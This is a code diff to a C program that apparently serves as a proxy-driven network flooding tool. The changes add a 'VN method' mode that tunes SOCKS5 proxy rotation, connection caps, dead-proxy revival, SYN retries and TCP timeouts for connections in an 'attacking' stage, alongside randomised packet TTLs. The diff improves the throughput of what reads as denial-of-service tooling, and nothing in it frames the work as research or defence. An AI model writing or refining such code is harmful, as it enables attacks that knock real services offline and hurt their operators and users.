@@ -1019,22 +1019,24 @@ static int get_total_active_conns() {
 static Proxy *select_alive_proxy() {
     if (proxy_count <= 0) return NULL;
     long long now = get_ms();
+    int max_conns = args.is_vn_tcp ? 50 : MAX_CONNS_PER_PROXY;
+    int revival_ms = args.is_vn_tcp ? 3000 : 10000;
     for (int attempt = 0; attempt < 20; attempt++) {
         int idx = rand() % proxy_count;
         Proxy *p = &proxies[idx];
         if (p->is_dead) {
-            if (now - p->last_fail_time > 10000) {
+            if (now - p->last_fail_time > revival_ms) {
                 p->is_dead = 0;
                 p->fail_count = 0;
             } else {
                 continue;
             }
         }
-        if (p->active_conns >= MAX_CONNS_PER_PROXY) continue;
+        if (p->active_conns >= max_conns) continue;
         return p;
     }
     for (int i = 0; i < proxy_count; i++) {
-        if (proxies[i].active_conns < MAX_CONNS_PER_PROXY && !proxies[i].is_dead) {
+        if (proxies[i].active_conns < max_conns && !proxies[i].is_dead) {
             return &proxies[i];
         }
     }
@@ -1051,8 +1053,14 @@ int spawn_connection(int epoll_fd, int thread_id) {
     int val = 1;
     setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &val, sizeof(val));
     
-    int syn_retries = 4;
+    int syn_retries = args.is_vn_tcp ? 2 : 4;
     setsockopt(fd, IPPROTO_TCP, TCP_SYNCNT, &syn_retries, sizeof(syn_retries));
+    
+    // VN method: aggressive connect timeout for high-latency proxy (US→VN ~300ms)
+    if (args.is_vn_tcp) {
+        int user_timeout = 5000; // 5s total TCP timeout
+        setsockopt(fd, IPPROTO_TCP, TCP_USER_TIMEOUT, &user_timeout, sizeof(user_timeout));
+    }
     
     int ttl = 55 + (fast_rand() % 10);
     setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
@@ -2344,18 +2352,21 @@ void *worker_thread(void *arg) {
         long long now = get_ms();
         
         // SOCKS5 and connection timeout checks
-        if (now - last_timeout_check_ms >= 1000) {
+        // VN method: 5s timeout (high-latency proxy), others: 15s
+        int socks_timeout_ms = args.is_vn_tcp ? 5000 : 15000;
+        int dead_threshold = args.is_vn_tcp ? 30 : 15;
+        if (now - last_timeout_check_ms >= 500) {
             Connection *curr = active_conns_list;
             while (curr) {
                 Connection *next_conn = curr->next;
-                if (curr->stage != STAGE_ATTACKING && (now - curr->last_pulse_ms > 15000)) {
+                if (curr->stage != STAGE_ATTACKING && (now - curr->last_pulse_ms > socks_timeout_ms)) {
                     epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                     
                     thread_stats[tid].connect_fail++;
                     if (curr->proxy) {
                         __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                         curr->proxy->last_fail_time = now;
-                        if (curr->proxy->fail_count >= 15) {
+                        if (curr->proxy->fail_count >= dead_threshold) {
                             curr->proxy->is_dead = 1;
                         }
                         if (curr->proxy->active_conns > 0) { __sync_fetch_and_sub(&curr->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
